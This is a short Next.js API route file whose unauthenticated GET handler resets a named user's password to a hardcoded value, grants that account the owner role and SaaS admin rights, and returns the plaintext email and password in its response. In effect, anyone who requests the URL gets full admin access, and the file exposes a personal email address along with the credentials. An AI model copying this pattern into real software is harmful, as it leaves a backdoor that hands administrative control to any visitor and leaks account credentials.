import { NextResponse } from "next/server";
import connectDB from "@/lib/db";
import User from "@/models/User";
import bcrypt from "bcryptjs";

export async function GET() {
  await connectDB();

  const newPassword = "Mintu@2026";

  const user = await User.findOneAndUpdate(
    { email: "mintuhossain0606@gmail.com" },
    {
      $set: {
        password: await bcrypt.hash(newPassword, 10),
        isSaasAdmin: true,
        role: "owner",
      },
    },
    { new: true }
  ).select("name email role isSaasAdmin");

  return NextResponse.json({
    success: true,
    message: "Password reset successful",
    loginEmail: "mintuhossain0606@gmail.com",
    loginPassword: newPassword,
    data: user,
  });
}